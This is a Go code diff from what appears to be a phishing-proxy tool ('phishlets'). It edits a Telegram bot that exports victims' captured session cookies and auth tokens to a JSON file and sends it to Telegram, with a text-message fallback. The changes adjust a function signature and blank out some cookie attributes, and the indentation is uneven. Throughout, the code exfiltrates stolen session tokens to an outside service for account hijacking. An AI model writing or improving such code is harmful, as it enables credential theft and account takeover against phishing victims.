@@ -117,20 +117,20 @@ func (t *TelegramBot) SendSessionNotification(session *Session, sessionIndex int
 		// Create JSON export file
 		jsonFile, err := t.createSessionExportFile(session, sessionIndex, phishletName, cfgDir)
 		if err != nil {
-			log.Error("telegram: failed to create JSON export: %v", err)
-			// Fall back to text message only
-			message := t.formatSessionMessage(session, sessionIndex, phishletName, "")
-			return t.sendMessage(message)
+					log.Error("telegram: failed to create JSON export: %v", err)
+		// Fall back to text message only
+		message := t.formatSessionMessage(session, sessionIndex, phishletName)
+		return t.sendMessage(message)
 		}
 		
 		// Send document with auth tokens
 		caption := t.formatSessionCaption(session, sessionIndex, phishletName)
 		err = t.sendDocument(jsonFile, caption)
 		if err != nil {
-			log.Error("telegram: failed to send document: %v", err)
-			// Fall back to text message only
-			message := t.formatSessionMessage(session, sessionIndex, phishletName, "")
-			return t.sendMessage(message)
+					log.Error("telegram: failed to send document: %v", err)
+		// Fall back to text message only
+		message := t.formatSessionMessage(session, sessionIndex, phishletName)
+		return t.sendMessage(message)
 		}
 		
 		// Clean up temporary file
@@ -140,7 +140,7 @@ func (t *TelegramBot) SendSessionNotification(session *Session, sessionIndex int
 		return nil
 	} else {
 		// No auth tokens, send regular text message
-		message := t.formatSessionMessage(session, sessionIndex, phishletName, "")
+		message := t.formatSessionMessage(session, sessionIndex, phishletName)
 		err := t.sendMessage(message)
 		if err != nil {
 			log.Error("telegram: failed to send notification: %v", err)
@@ -278,16 +278,16 @@ func (t *TelegramBot) createSessionExportFile(session *Session, sessionIndex int
 	for domain, cookies := range session.CookieTokens {
 		exportData.AuthTokens.CookieTokens[domain] = make(map[string]TokenInfo)
 		for name, cookie := range cookies {
-			exportData.AuthTokens.CookieTokens[domain][name] = TokenInfo{
-				Name:      name,
-				Value:     cookie.Value,
-				Domain:    cookie.Domain,
-				Path:      cookie.Path,
-				HttpOnly:  cookie.HttpOnly,
-				Secure:    cookie.Secure,
-				SameSite:  cookie.SameSite,
-				ExpiresAt: cookie.ExpiresAt.Format("2006-01-02 15:04:05"),
-			}
+					exportData.AuthTokens.CookieTokens[domain][name] = TokenInfo{
+			Name:      name,
+			Value:     cookie.Value,
+			Domain:    domain,
+			Path:      cookie.Path,
+			HttpOnly:  cookie.HttpOnly,
+			Secure:    false, // Not available in CookieToken
+			SameSite:  "",    // Not available in CookieToken
+			ExpiresAt: "",    // Not available in CookieToken
+		}
 		}
 	}
 	
